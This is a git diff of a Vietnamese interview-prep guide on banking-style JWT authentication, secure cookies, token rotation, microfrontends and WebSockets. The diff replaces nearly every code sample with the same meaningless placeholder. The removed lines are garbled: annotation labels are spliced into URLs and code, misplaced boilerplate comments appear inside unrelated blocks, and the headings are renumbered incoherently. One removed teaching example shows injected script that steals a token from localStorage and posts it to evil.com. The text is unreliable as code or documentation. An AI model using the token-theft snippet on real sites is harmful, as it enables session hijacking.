-const balance = await apiCall('https: // Chú giải: api.bank.com/account/balance');
-console.log(balance); // Chú giải: { balance: 1000000, currency: 'VND' }
-
- // Chú giải: ============================================
- // Chú giải: Backend: Verify Access Token
- // Chú giải: ============================================
-
- // Chú giải: Middleware: Verify JWT token
-function authenticateToken(req, res, next) {
- // Chú giải: 1. Lấy token từ header
-  const authHeader = req.headers['authorization'];
-  const token = authHeader && authHeader.split(' ')[1]; // Chú giải: "Bearer <token>"
-  
-  if (!token) {
-    return res.status(401).json({ error: 'No token provided' });
-  }
-  
- // Chú giải: 2. Verify token
-  jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, (err, user) => {
-    if (err) {
-      // Token expired hoặc invalid
-      return res.status(403).json({ error: 'Invalid token' });
-    }
-    
-    // 3. Attach user info vào request
-    req.user = user; // Chú giải: { sub: "123", role: "trader", ... }
-    next();
-  });
-}
-
- // Chú giải: Protected route
-app.get('/account/balance', authenticateToken, async (req, res) => {
-  const userId = req.user.sub;
-  const balance = await db.getBalance(userId);
-  res.json(balance);
-});
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 **C. Refresh Token Flow (Làm Mới Access Token):**
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: Frontend: Refresh Access Token
- // Chú giải: ============================================
-
-async function refreshAccessToken(): Promise<void> {
-  try {
-    const response = await fetch('https: // Chú giải: api.bank.com/auth/refresh', {
-      method: 'POST',
-      credentials: 'include', // Chú giải: Gửi httpOnly cookie (refreshToken)
-      headers: {
-        'Content-Type': 'application/json',
-      },
-    });
-    
-    if (!response.ok) {
-      // Refresh token hết hạn hoặc invalid → logout
-      throw new Error('Refresh token expired');
-    }
-    
-    const data = await response.json();
- // Chú giải: {
- // Chú giải: accessToken: "new-token...",
- // Chú giải: expiresIn: 900
- // Chú giải: }
-    
- // Chú giải: Cập nhật Access Token mới
-    accessToken = data.accessToken;
-    
-    console.log('Access token refreshed');
-  } catch (error) {
-    console.error('Refresh failed:', error);
-    
- // Chú giải: Logout user
-    await logout();
-    window.location.href = '/login';
-  }
-}
-
-// Auto-refresh token trước khi hết hạn
-function startTokenRefreshTimer() {
-  // Refresh token trước 1 phút khi hết hạn
-  const refreshTime = (15 - 1) * 60 * 1000;  // 14 phút
-  
-  setInterval(async () => {
-    await refreshAccessToken();
-  }, refreshTime);
-}
-
-// Gọi khi app khởi động
-startTokenRefreshTimer();
-
- // Chú giải: ============================================
- // Chú giải: Backend: Refresh Token Endpoint
- // Chú giải: ============================================
-
-app.post('/auth/refresh', async (req, res) => {
- // Chú giải: 1. Lấy Refresh Token từ httpOnly cookie
-  const refreshToken = req.cookies.refreshToken;
-  
-  if (!refreshToken) {
-    return res.status(401).json({ error: 'No refresh token' });
-  }
-  
-  try {
- // Chú giải: 2. Verify Refresh Token
-    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
-    
- // Chú giải: 3. Check token trong database (chưa bị revoke?)
-    const tokenRecord = await db.findRefreshToken(decoded.jti);
-    if (!tokenRecord || tokenRecord.isRevoked) {
-      return res.status(403).json({ error: 'Token revoked' });
-    }
-    
-    // 4. Check user vẫn còn active
-    const user = await db.findUserById(decoded.sub);
-    if (!user || user.isLocked) {
-      return res.status(403).json({ error: 'User inactive' });
-    }
-    
- // Chú giải: 5. Generate Access Token mới
-    const newAccessToken = jwt.sign(
-      {
-        sub: user.id,
-        name: user.name,
-        email: user.email,
-        role: user.role,
-        permissions: user.permissions,
-      },
-      process.env.ACCESS_TOKEN_SECRET,
-      { expiresIn: '15m' }
-    );
-    
- // Chú giải: 6. Log refresh event
-    await logEvent({
-      type: 'TOKEN_REFRESH',
-      userId: user.id,
-      tokenId: decoded.jti,
-      timestamp: new Date(),
-    });
-    
- // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
-    res.json({
-      accessToken: newAccessToken,
-      expiresIn: 900,
-    });
-    
-  } catch (error) {
-    // Token expired hoặc invalid
-    return res.status(403).json({ error: 'Invalid refresh token' });
-  }
-});
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 **D. Logout Flow (Đăng Xuất):**
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: Frontend: Logout
- // Chú giải: ============================================
-
-async function logout(): Promise<void> {
-  try {
- // Chú giải: 1. Gọi API logout (revoke refresh token)
-    await fetch('https: // Chú giải: api.bank.com/auth/logout', {
-      method: 'POST',
-      credentials: 'include', // Chú giải: Gửi refreshToken cookie
-    });
-    
-    // 2. Xóa Access Token khỏi memory
-    accessToken = null;
-    
-    // 3. Xóa user info khỏi localStorage
-    localStorage.removeItem('user');
-    
- // Chú giải: 4. Clear any cached data
-    sessionStorage.clear();
-    
- // Chú giải: 5. Redirect to login
-    window.location.href = '/login';
-    
-  } catch (error) {
-    console.error('Logout error:', error);
-    // Vẫn redirect về login dù có lỗi
-    window.location.href = '/login';
-  }
-}
-
- // Chú giải: ============================================
- // Chú giải: Backend: Logout Endpoint
- // Chú giải: ============================================
-
-app.post('/auth/logout', async (req, res) => {
- // Chú giải: 1. Lấy Refresh Token từ cookie
-  const refreshToken = req.cookies.refreshToken;
-  
-  if (refreshToken) {
-    try {
- // Chú giải: 2. Decode token
-      const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
-      
- // Chú giải: 3. Revoke token trong database (blacklist)
-      await db.revokeRefreshToken(decoded.jti);
-      
- // Chú giải: 4. Log logout event
-      await logEvent({
-        type: 'LOGOUT',
-        userId: decoded.sub,
-        tokenId: decoded.jti,
-        timestamp: new Date(),
-      });
-      
-    } catch (error) {
-      console.error('Logout error:', error);
-    }
-  }
-  
-  // 5. Xóa Refresh Token cookie
-  res.clearCookie('refreshToken', {
-    httpOnly: true,
-    secure: true,
-    sameSite: 'strict',
-    path: '/auth/refresh',
-  });
-  
- // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
-  res.json({ message: 'Logged out successfully' });
-});
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -27712,161 +17544,23 @@ app.post('/auth/logout', async (req, res) => {
 
 **A. Cookie Security:**
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: SECURE COOKIE CONFIGURATION
- // Chú giải: ============================================
-
-// ✅ ĐÚNG: Secure httpOnly Cookie
-res.cookie('refreshToken', token, {
-  httpOnly: true,    // JavaScript KHÔNG đọc được (chống XSS)
-  secure: true,      // Chỉ gửi qua HTTPS (không qua HTTP)
-  sameSite: 'strict', // Chống CSRF (không gửi cross-site)
-  maxAge: 30 * 24 * 60 * 60 * 1000,  // 30 ngày
-  path: '/auth/refresh', // Chú giải: Chỉ gửi tới endpoint refresh
-  domain: '.bank.com',  // Cho phép subdomain
-});
-
-// ❌ SAI: Không secure
-res.cookie('refreshToken', token, {
-  httpOnly: false,   // ❌ JS đọc được → XSS risk
-  secure: false, // Chú giải: ❌ Gửi qua HTTP → MITM attack
-  sameSite: 'none', // Chú giải: ❌ Gửi cross-site → CSRF risk
-});
-
- // Chú giải: ============================================
-// Cookie Attributes Giải Thích
- // Chú giải: ============================================
-
-/**
- * httpOnly: true
- * - JavaScript không đọc được: document.cookie = undefined
- * - Chỉ server đọc được
- * - Chống XSS: Hacker inject script cũng không lấy được cookie
- * 
- * secure: true
- * - Chỉ gửi qua HTTPS (không qua HTTP)
- * - Chống MITM (Man-In-The-Middle) attack
- * - Production MUST có
- * 
- * sameSite: 'strict'
- * - Không gửi cookie khi navigate từ site khác
- * - Example: evil.com → bank.com (cookie KHÔNG gửi)
- * - Chống CSRF attack
- * - Options: 'strict' | 'lax' | 'none'
- *   - strict: Không gửi cross-site (most secure)
- *   - lax: Gửi khi GET navigation (moderate)
- *   - none: Gửi mọi cross-site (least secure)
- * 
- * path: '/auth/refresh'
- * - Cookie chỉ gửi tới endpoint này
- * - Giảm exposure (không gửi tới mọi endpoint)
- * 
- * domain: '.bank.com'
- * - Cho phép subdomain: api.bank.com, www.bank.com
- * - Không set = chỉ exact domain
- */
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **B. Token Storage:**
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: WHERE TO STORE TOKENS?
- // Chú giải: ============================================
-
- // Chú giải: ✅ Access Token: MEMORY (JavaScript variable)
-let accessToken: string | null = null;
-
-// Lý do:
-// - Mất khi refresh page (an toàn hơn)
-// - Không bị XSS nếu page refresh
-// - Short-lived (15 phút) nên OK
-
- // Chú giải: ✅ Refresh Token: httpOnly Cookie
- // Chú giải: Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict
-
-// Lý do:
-// - JavaScript không đọc được (chống XSS)
- // Chú giải: - Auto gửi với requests (convenient)
- // Chú giải: - Long-lived nhưng secure
-
- // Chú giải: ❌ NEVER:
-localStorage.setItem('accessToken', token); // Chú giải: ❌ XSS risk!
-sessionStorage.setItem('accessToken', token); // Chú giải: ❌ Vẫn XSS risk!
-document.cookie = `accessToken=${token}`; // Chú giải: ❌ Readable by JS
-
- // Chú giải: ============================================
- // Chú giải: XSS Attack Example
- // Chú giải: ============================================
-
-// Nếu lưu token trong localStorage:
- // Chú giải: Hacker inject script:
-<script>
- // Chú giải: Steal token
-  const token = localStorage.getItem('accessToken');
-  
- // Chú giải: Send to hacker server
-  fetch('https: // Chú giải: evil.com/steal', {
-    method: 'POST',
-    body: JSON.stringify({ token }),
-  });
-  
-  // Now hacker có token → impersonate user!
-</script>
-
-// Nếu dùng httpOnly cookie:
- // Chú giải: Hacker inject script:
-<script>
- // Chú giải: Try to steal
-  const token = document.cookie; // Chú giải: undefined (httpOnly)
-  
- // Chú giải: Cannot access! ✅ Secure
-</script>
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **C. Token Rotation (Xoay Vòng Token):**
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: REFRESH TOKEN ROTATION
- // Chú giải: ============================================
-
- // Chú giải: Backend: Mỗi lần refresh → generate token mới
-app.post('/auth/refresh', async (req, res) => {
-  const oldRefreshToken = req.cookies.refreshToken;
-  
- // Chú giải: Verify old token
-  const decoded = jwt.verify(oldRefreshToken, SECRET);
-  
- // Chú giải: Generate NEW Access Token
-  const newAccessToken = jwt.sign({ ... }, SECRET, { expiresIn: '15m' });
-  
- // Chú giải: Generate NEW Refresh Token (rotation)
-  const newRefreshToken = jwt.sign(
-    { jti: uuidv4(), sub: decoded.sub },
-    SECRET,
-    { expiresIn: '30d' }
-  );
-  
- // Chú giải: Revoke old Refresh Token
-  await db.revokeRefreshToken(decoded.jti);
-  
- // Chú giải: Save new Refresh Token
-  await db.saveRefreshToken(newRefreshToken);
-  
- // Chú giải: Set new Refresh Token cookie
-  res.cookie('refreshToken', newRefreshToken, { httpOnly: true, ... });
-  
- // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
-  res.json({ accessToken: newAccessToken });
-});
-
-// Lợi ích:
- // Chú giải: - Mỗi lần refresh → token mới
-// - Old token bị revoke → không dùng lại được
-// - Nếu hacker có old token → useless
-// - Detect reuse attack (token revoked mà vẫn dùng)
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -27875,374 +17569,48 @@ app.post('/auth/refresh', async (req, res) => {
 
 **A. Concurrent Requests (Nhiều Request Cùng Lúc):**
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: Problem: Race Condition
- // Chú giải: ============================================
-
- // Chú giải: User vừa mở 10 tabs, mỗi tab gọi API
-// → 10 requests cùng lúc
-// → Token hết hạn
-// → 10 refresh requests cùng lúc ❌
-
- // Chú giải: ============================================
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
- // Chú giải: ============================================
-
-let refreshPromise: Promise<string> | null = null;
-
-async function getValidToken(): Promise<string> {
-  // Nếu token còn hiệu lực → return luôn
-  if (accessToken && !isTokenExpired(accessToken)) {
-    return accessToken;
-  }
-  
-  // Nếu đang refresh → chờ promise hiện tại
-  if (refreshPromise) {
-    return await refreshPromise;
-  }
-  
-  // Tạo promise mới để refresh
-  refreshPromise = refreshAccessToken().then((newToken) => {
-    refreshPromise = null; // Chú giải: Reset
-    return newToken;
-  });
-  
-  return await refreshPromise;
-}
-
-async function apiCall(url: string) {
-  const token = await getValidToken(); // Chú giải: Chờ token valid
-  
-  return fetch(url, {
-    headers: {
-      'Authorization': `Bearer ${token}`,
-    },
-  });
-}
-
-// Kết quả:
-// - 10 requests đầu tiên trigger refresh
-// - Chỉ 1 refresh request thực sự gửi đi
-// - 9 requests còn lại chờ promise đó
-// - Tất cả dùng chung 1 token mới
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **B. Inactivity Timeout (Tự Động Logout Khi Không Hoạt Động):**
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: AUTO LOGOUT AFTER INACTIVITY
-// (Banking/Trading yêu cầu)
- // Chú giải: ============================================
-
-class InactivityTimer {
-  private timeout: number = 5 * 60 * 1000;  // 5 phút không hoạt động
-  private timer: NodeJS.Timeout | null = null;
-  
-  constructor() {
-    this.startTimer();
-    this.listenActivity();
-  }
-  
-  // Bắt đầu đếm
-  private startTimer() {
-    this.clearTimer();
-    
-    this.timer = setTimeout(() => {
-      this.onTimeout();
-    }, this.timeout);
-  }
-  
-  // Reset timer khi có activity
-  private resetTimer() {
-    this.startTimer();
-  }
-  
-  // Lắng nghe user activity
-  private listenActivity() {
-    const events = ['mousedown', 'keydown', 'scroll', 'touchstart'];
-    
-    events.forEach((event) => {
-      document.addEventListener(event, () => {
-        this.resetTimer();
-      }, { passive: true });
-    });
-  }
-  
- // Chú giải: Timeout → logout
-  private onTimeout() {
-    console.log('Inactivity timeout - logging out');
-    
- // Chú giải: Show warning dialog
-    showWarningDialog('Bạn đã không hoạt động trong 5 phút. Vui lòng đăng nhập lại.');
-    
- // Chú giải: Logout
-    logout();
-  }
-  
-  private clearTimer() {
-    if (this.timer) {
-      clearTimeout(this.timer);
-      this.timer = null;
-    }
-  }
-}
-
- // Chú giải: Usage:
-const inactivityTimer = new InactivityTimer();
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **C. Device Fingerprinting (Nhận Diện Thiết Bị):**
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: DEVICE FINGERPRINTING
- // Chú giải: ============================================
-
-function getDeviceFingerprint(): string {
-  const data = {
-    userAgent: navigator.userAgent,
-    language: navigator.language,
-    platform: navigator.platform,
-    screenResolution: `${screen.width}x${screen.height}`,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    colorDepth: screen.colorDepth,
-    cpuCores: navigator.hardwareConcurrency,
-  };
-  
- // Chú giải: Hash fingerprint
-  const fingerprint = hashSHA256(JSON.stringify(data));
-  return fingerprint;
-}
-
- // Chú giải: Backend: Verify device
-app.post('/auth/login', async (req, res) => {
-  const { deviceId } = req.body;
-  const user = await db.findUser(...);
-  
-  // Check device đã đăng ký chưa
-  const knownDevice = await db.findDevice(user.id, deviceId);
-  
-  if (!knownDevice) {
-    // Thiết bị mới → send OTP/email verification
-    await sendOTPEmail(user.email);
-    
-    return res.status(403).json({
-      error: 'Unknown device',
-      requireOTP: true,
-    });
-  }
-  
- // Chú giải: Device OK → proceed login
- // Chú giải: ...
-});
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **D. Logout All Devices (Đăng Xuất Tất Cả Thiết Bị):**
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: LOGOUT ALL DEVICES
- // Chú giải: ============================================
-
- // Chú giải: Frontend: Trigger logout all
-async function logoutAllDevices() {
-  await fetch('https: // Chú giải: api.bank.com/auth/logout-all', {
-    method: 'POST',
-    credentials: 'include',
-  });
-  
- // Chú giải: Redirect to login
-  window.location.href = '/login';
-}
-
- // Chú giải: Backend: Revoke all refresh tokens
-app.post('/auth/logout-all', authenticateToken, async (req, res) => {
-  const userId = req.user.sub;
-  
- // Chú giải: Revoke tất cả refresh tokens của user
-  await db.revokeAllRefreshTokens(userId);
-  
- // Chú giải: Log event
-  await logEvent({
-    type: 'LOGOUT_ALL_DEVICES',
-    userId,
-    timestamp: new Date(),
-  });
-  
-  res.json({ message: 'Logged out from all devices' });
-});
-
- // Chú giải: Use case:
- // Chú giải: - User nghi ngờ account bị hack
- // Chú giải: - Change password → logout all devices
- // Chú giải: - Admin revoke access
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 #### **⚠️ 5. Common Security Mistakes (Lỗi Bảo Mật Thường Gặp)**
 
-```typescript
- // Chú giải: ❌ LỖI 1: Lưu token trong localStorage
-localStorage.setItem('accessToken', token); // Chú giải: XSS risk!
-
-// ✅ ĐÚNG: Lưu trong memory
-let accessToken: string | null = null;
-
- // Chú giải: ────────────────────────────────────────
-
-// ❌ LỖI 2: Access Token thời hạn quá dài
-jwt.sign(payload, secret, { expiresIn: '30d' });  // Quá lâu!
-
-// ✅ ĐÚNG: 5-15 phút
-jwt.sign(payload, secret, { expiresIn: '15m' });
-
- // Chú giải: ────────────────────────────────────────
-
-// ❌ LỖI 3: Không verify token signature
-const decoded = jwt.decode(token);  // ❌ Chỉ decode, không verify!
-
-// ✅ ĐÚNG: Verify signature
-jwt.verify(token, secret, (err, decoded) => { ... });
-
- // Chú giải: ────────────────────────────────────────
-
-// ❌ LỖI 4: Không revoke refresh token khi logout
-// User logout → token vẫn valid → hacker dùng được
-
-// ✅ ĐÚNG: Revoke token vào database blacklist
-await db.revokeRefreshToken(tokenId);
-
- // Chú giải: ────────────────────────────────────────
-
- // Chú giải: ❌ LỖI 5: Gửi sensitive data trong token
-jwt.sign({
-  password: user.password, // Chú giải: ❌ NEVER!
-  creditCard: user.creditCard, // Chú giải: ❌ NEVER!
-}, secret);
-
-// ✅ ĐÚNG: Chỉ non-sensitive data
-jwt.sign({
-  sub: user.id,
-  name: user.name,
-  role: user.role,
-}, secret);
-
- // Chú giải: ────────────────────────────────────────
-
-// ❌ LỖI 6: Không check token blacklist
- // Chú giải: Token bị revoke nhưng vẫn accept
-
-// ✅ ĐÚNG: Check blacklist
-const tokenRecord = await db.findRefreshToken(tokenId);
-if (!tokenRecord || tokenRecord.isRevoked) {
-  return res.status(403).json({ error: 'Token revoked' });
-}
-
- // Chú giải: ────────────────────────────────────────
-
-// ❌ LỖI 7: Không rate limit refresh endpoint
- // Chú giải: Hacker brute force refresh endpoint
-
-// ✅ ĐÚNG: Rate limit
-app.use('/auth/refresh', rateLimit({
-  windowMs: 15 * 60 * 1000,  // 15 phút
-  max: 10, // Chú giải: Max 10 requests
-}));
-
- // Chú giải: ────────────────────────────────────────
-
-// ❌ LỖI 8: Không log security events
-// Không biết khi nào bị attack
-
-// ✅ ĐÚNG: Log everything
-await logEvent({
-  type: 'LOGIN_FAILED',
-  username,
-  ipAddress: req.ip,
-  reason: 'Invalid password',
-  timestamp: new Date(),
-});
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 #### **📊 6. Complete Flow Diagram**
 
-```
-┌────────────────────────────────────────────────────────────────────┐
-│           COMPLETE AUTHENTICATION FLOW                             │
-│      (Banking/Trading System - Hệ Thống Ngân Hàng)                │
-└────────────────────────────────────────────────────────────────────┘
-
-1️⃣ LOGIN
-   User                     Frontend                Backend
-    │                          │                       │
-    │─── Enter credentials ──→│                       │
-    │                          │─── POST /login ─────→│
-    │                          │    {username, pwd}    │
-    │                          │                       │
-    │                          │                       │─ Verify credentials
-    │                          │                       │─ Generate tokens
-    │                          │                       │─ Save refresh token
-    │                          │                       │
-    │                          │←─ Set-Cookie ────────│
-    │                          │   refreshToken        │
-    │                          │   (httpOnly)          │
-    │                          │                       │
-    │                          │←─ { accessToken } ───│
-    │←─ Redirect /dashboard ─│                       │
-    │                          │                       │
-    └─ accessToken in memory  │                       │
-
-2️⃣ API CALL
-   User                     Frontend                Backend
-    │                          │                       │
-    │─── Click "View Balance"→│                       │
-    │                          │─ GET /balance ──────→│
-    │                          │   Authorization:      │
-    │                          │   Bearer <token>      │
-    │                          │                       │
-    │                          │                       │─ Verify token
-    │                          │                       │─ Check permissions
-    │                          │                       │
-    │                          │←─ { balance: 1M } ───│
-    │←─ Display balance ──────│                       │
-
-3️⃣ TOKEN REFRESH (Auto - mỗi 14 phút)
-   Frontend                Backend
-      │                       │
-      │─ POST /auth/refresh →│
-      │   Cookie:             │
-      │   refreshToken        │
-      │                       │
-      │                       │─ Verify refresh token
-      │                       │─ Check not revoked
-      │                       │─ Generate new access token
-      │                       │
-      │←─ { accessToken } ───│
-      │                       │
-   Update accessToken         │
-   in memory                  │
-
-4️⃣ LOGOUT
-   User                     Frontend                Backend
-    │                          │                       │
-    │─── Click "Logout" ─────→│                       │
-    │                          │─ POST /logout ──────→│
-    │                          │   Cookie:             │
-    │                          │   refreshToken        │
-    │                          │                       │
-    │                          │                       │─ Revoke token
-    │                          │                       │─ Clear cookie
-    │                          │                       │
-    │                          │←─ { success } ───────│
-    │                          │                       │
-    │                          │─ accessToken = null   │
-    │                          │─ Clear localStorage   │
-    │←─ Redirect /login ──────│                       │
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -28290,13 +17658,14 @@ await logEvent({
 - **Audit logging** = detect suspicious activities
 - **Multi-factor** everything (MFA, device fingerprint, inactivity timeout)
 ---
-## 44. 🧱 Q44: Microfrontend & Monorepo - Module Federation, Multi-Framework, Communication Patterns  
 
-**P1: Tên câu hỏi:** 🧱 Q44: Microfrontend & Monorepo - Module Federation, Multi-Framework, Communication Patterns  
+## 47. Q47: 🧱 Q44: Microfrontend & Monorepo - Module Federation, Multi-Framework, Communication Patterns
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🧱 Q44: Microfrontend & Monorepo - Module Federation, Multi-Framework, Communication Patterns
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 48. Q48: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
 
@@ -28309,27 +17678,25 @@ await logEvent({
 
 **🔧 Module Federation (Webpack 5 / Vite):**
 - **Expose**: MFE expose components/modules.
-  ```js
- // Chú giải: microfrontend-a/webpack.config.js
-  new ModuleFederationPlugin({
-    name: 'mfeA',
-    filename: 'remoteEntry.js',
-    exposes: { './Button': './src/Button' }
-  });
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
 - **Consume**: Host import remote modules.
-  ```js
- // Chú giải: shell/webpack.config.js
-  new ModuleFederationPlugin({
-    remotes: { mfeA: 'mfeA@http: // Chú giải: localhost:3001/remoteEntry.js' }
-  });
- // Chú giải: Usage
-  const Button = lazy(() => import('mfeA/Button'));
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
 - **Shared Dependencies**: Share React, libraries → load once (not duplicate).
-  ```js
-  shared: { react: { singleton: true }, 'react-dom': { singleton: true } }
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 **♻️ Communication Patterns:**
 1. **Props/Callbacks**: Parent pass props to child MFE → simple, tightly coupled.
@@ -28340,20 +17707,19 @@ await logEvent({
 **🎯 Multi-Framework Support:**
 - **React + Vue + Angular**: Mỗi MFE dùng framework khác nhau.
 - **Web Components**: Wrap MFEs trong custom elements → framework-agnostic.
-  ```js
- // Chú giải: mfe-vue wrapped as <vue-widget>
-  customElements.define('vue-widget', VueWidgetElement);
- // Chú giải: Use in React
-  <vue-widget data={data} />
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 **🔑 Monorepo (Nx / Turborepo):**
 - **Concept**: 1 repo chứa multiple projects → shared tooling, dependencies.
 - **Benefits**:
-  - Atomic commits across projects.
-  - Shared libraries, utilities.
-  - Consistent tooling (ESLint, Prettier, TypeScript configs).
-  - Dependency graph → build chỉ affected projects.
+- Atomic commits across projects.
+- Shared libraries, utilities.
+- Consistent tooling (ESLint, Prettier, TypeScript configs).
+- Dependency graph → build chỉ affected projects.
 - **Tools**: Nx (Angular ecosystem), Turborepo (Vercel), Lerna (legacy).
 
 **⚠️ Trade-offs:**
@@ -28375,13 +17741,12 @@ await logEvent({
 - **Routing**: Each MFE handle own routes + Shell sync URL state.
 
 **🚀 Real-World Example (E-commerce):**
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
-Shell (Host App)
-├── Product Catalog MFE (Team A - React)
-├── Shopping Cart MFE (Team B - Vue)
-├── Checkout MFE (Team C - Angular)
-└── User Profile MFE (Team D - React)
-```
+
 - Team A deploy catalog update → không ảnh hưởng Teams B, C, D.
 - Shared: React, UI library (button, input) via Module Federation.
 
@@ -28407,160 +17772,40 @@ Giải thích chi tiết kiến trúc Microfrontend và Monorepo, bao gồm Modu
 
 **💔 Vấn Đề Của Monolithic Frontend (The Problem):**
 
-```typescript
- // Chú giải: ===================================================
-// ❌ MONOLITHIC FRONTEND - VÍ DỤ THỰC TẾ
- // Chú giải: ===================================================
-
-// Tình huống: Công ty e-commerce lớn với 1 app React khổng lồ
-
-📦 ecommerce-app/
-├── src/
-│   ├── pages/
-│   │   ├── ProductCatalog/      ← Team A maintain (10 devs)
-│   │   ├── ShoppingCart/        ← Team B maintain (8 devs)
-│   │   ├── Checkout/            ← Team C maintain (12 devs)
-│   │   ├── UserProfile/         ← Team D maintain (6 devs)
-│   │   ├── OrderHistory/        ← Team E maintain (5 devs)
-│   │   └── AdminDashboard/      ← Team F maintain (8 devs)
-│   │
-│   └── package.json             ← 1 file duy nhất cho tất cả!
-│       dependencies: {
-│         "react": "17.0.0",     ← Team A muốn upgrade React 18
-│         "redux": "4.0.0",      ← Team C muốn dùng Zustand
-│         ...500 dependencies    ← Cài đặt CHẬM (5-10 phút!)
-│       }
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **❌ Vấn Đề 1: DEPLOYMENT HELL (Địa Ngục Deploy)**
 
-```
-┌──────────────────────────────────────────────────────────┐
-│         MONOLITHIC DEPLOYMENT NIGHTMARE                   │
-├──────────────────────────────────────────────────────────┤
-│                                                           │
-│  Team A fix bug nhỏ trong ProductCatalog (1 dòng code)  │
-│              ↓                                            │
-│  ❌ Phải build TOÀN BỘ app (15-20 phút)                 │
-│  ❌ Test TOÀN BỘ app (2-3 giờ)                          │
-│  ❌ Deploy TOÀN BỘ app → risk cho tất cả teams!         │
-│  ❌ Nếu có bug → TOÀN BỘ app down!                      │
-│                                                           │
-│  Timeline:                                                │
-│  ├─ 10:00 AM: Team A commit fix                         │
-│  ├─ 10:20 AM: Build xong (20 phút)                      │
-│  ├─ 01:00 PM: QA test xong (2h 40 phút)                 │
-│  ├─ 02:00 PM: Deploy production                         │
-│  └─ 02:30 PM: Rollback vì bug từ Team C! ❌             │
-│                                                           │
-│  ⏱️ Tổng: 4.5 giờ cho 1 thay đổi nhỏ!                   │
-└──────────────────────────────────────────────────────────┘
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **❌ Vấn Đề 2: TEAM CONFLICTS (Xung Đột Giữa Teams)**
 
-```typescript
-// ❌ Team A: Muốn dùng React 18 + TypeScript strict
-// ❌ Team B: Vẫn đang dùng React 17 (legacy code)
- // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
- // Chú giải: ❌ Team D: Muốn migrate từ Redux → Zustand
-
-// Kết quả: KHÔNG AI ĐƯỢC LÀM GÌ CẢ!
-// → Phải họp 6 teams để đồng ý 1 quyết định
-// → Mất 2-3 tuần chỉ để quyết định upgrade React
-// → Team C không được dùng Svelte → frustrated → nghỉ việc 😢
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **❌ Vấn Đề 3: SLOW BUILD TIME (Build Chậm)**
 
-```
-┌──────────────────────────────────────────────────────────┐
-│              BUILD TIME COMPARISON                        │
-├──────────────────────────────────────────────────────────┤
-│                                                           │
-│  MONOLITHIC (1 app lớn):                                 │
-│  ├─ npm install: 8-10 phút (500 dependencies)           │
-│  ├─ Build: 15-20 phút                                    │
-│  ├─ Hot reload: 5-10 giây (chậm!)                       │
-│  └─ Dev server start: 2-3 phút                          │
-│                                                           │
-│  ⏱️ Developer experience: RẤT TỆ!                        │
-│  😢 Devs phải đợi 10s mỗi lần save code                  │
-└──────────────────────────────────────────────────────────┘
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **❌ Vấn Đề 4: MERGE CONFLICTS (Xung Đột Merge)**
 
-```bash
----
-## 45. 🔌 Q45: WebSocket & Real-time Streaming - WebSocket, Socket.IO, Centrifuge  
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-**P1: Tên câu hỏi:** 🔌 Q45: WebSocket & Real-time Streaming - WebSocket, Socket.IO, Centrifuge  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
-
-**"WebSocket = persistent bidirectional TCP connection cho real-time data. Socket.IO = WebSocket wrapper với auto-reconnect + rooms. Centrifuge = scalable pub/sub với Redis for enterprise."**
-
-**🔑 3 Technologies:**
-
-**1. Native WebSocket API:**
-- **Protocol**: `ws://` (unencrypted) hoặc `wss://` (SSL/TLS)
-- **Persistent connection** - 1 handshake, reuse mãi
-- **Bidirectional** - server push data bất cứ lúc nào
-- Use case: Trading platforms (real-time prices), chat, live notifications
-- Ưu điểm: Low latency (~50ms), less bandwidth than polling
-
-**2. Socket.IO (High-Level Library):**
